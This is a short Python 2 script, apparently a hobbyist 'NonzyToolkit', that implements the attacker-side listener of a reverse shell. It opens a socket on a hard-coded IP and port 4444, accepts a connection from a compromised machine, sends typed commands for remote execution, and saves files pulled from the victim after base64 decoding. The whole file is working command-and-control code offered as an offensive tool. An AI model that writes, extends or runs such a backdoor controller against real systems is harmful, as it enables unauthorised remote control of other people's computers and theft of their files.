#!/usr/bin/env python

import socket
import os
import json
import base64
import optparse

import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0)
		print colored("[-] waiting for incoming connection >>>", "yellow")

		self.connection, address = listener.accept()
		print colored("[+] Got connection from " + str(address), "green")

	#transfer data using json
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	#recieve data using json
	def reliable_recieve(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
		
	#download files and decode base64
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Downloaded successful"

	def execute_remotely(self, command):
		self.reliable_send(command)
		
		#action when user wants to exit program
		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.reliable_recieve()
		
	def run(self):
		while True:
			command = raw_input(">>> ")
			command = command.split(" ")
			result = self.execute_remotely(command)
			
			#action when user wants to download a file
			if command[0] == "download":
				result = self.write_file(command[1], result)

			print(result)

try:
	my_listener = Listener("192.168.43.106", 4444)
	my_listener.run()
except KeyboardInterrupt:
	pass